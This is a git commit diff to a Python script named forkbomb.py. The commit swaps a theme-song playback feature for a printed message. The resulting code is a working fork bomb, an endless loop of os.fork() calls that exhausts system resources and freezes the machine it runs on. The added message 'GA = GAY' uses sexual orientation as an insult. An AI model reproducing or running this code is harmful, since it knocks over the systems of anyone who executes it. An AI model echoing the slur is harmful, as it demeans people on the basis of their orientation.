72c78ca04608523f0bed60997f1ade9a8ec68115
ImDaNoob <42329466+ImDaNoob@users.noreply.github.com>
2018-11-11 13:21:13 -0500

    Custom Message Printing
    Instead of a song, it prints a message.

--- forkbomb.py
+++ forkbomb.py
@@ -1,15 +1,8 @@
 import os
-import pygame
-import time
 
 def main():
-    pygame.mixer.init()
-    song = pygame.mixer.Sound("Curb_Your_Enthusiasm_theme_song.wav")
-    pygame.mixer.Sound.play(song)
-    executeFork()
-
-def executeFork():
     while 1:
+        print ("GA = GAY")
         os.fork()
 
 if __name__ == "__main__":
